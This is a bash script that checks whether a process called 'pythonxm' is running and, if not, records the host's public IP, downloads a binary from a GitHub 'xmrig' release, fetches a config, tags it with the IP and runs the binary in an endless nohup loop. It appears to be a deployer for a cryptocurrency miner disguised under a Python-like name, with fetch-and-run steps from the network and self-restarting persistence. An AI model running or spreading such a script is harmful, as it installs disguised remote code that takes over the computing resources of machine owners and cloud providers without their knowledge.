#!bin/bash -xe 
if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
then echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)";
iip=$(curl https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io
rm -rf pythonxm
rm -rf config3.json
rm -rf nohup.out
wget https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
wget https://github.com/one10001/10001code/raw/main/config3.json
sed -i "s+ip0001+$IPNAME+g" config3.json
while true 
  do
  nohup ./pythonxm -c config3.json
  tail -f nohup.out
  done

else 

echo "It's ok : $(ps -aux |grep pythonxm |wc -l)"; 

fi
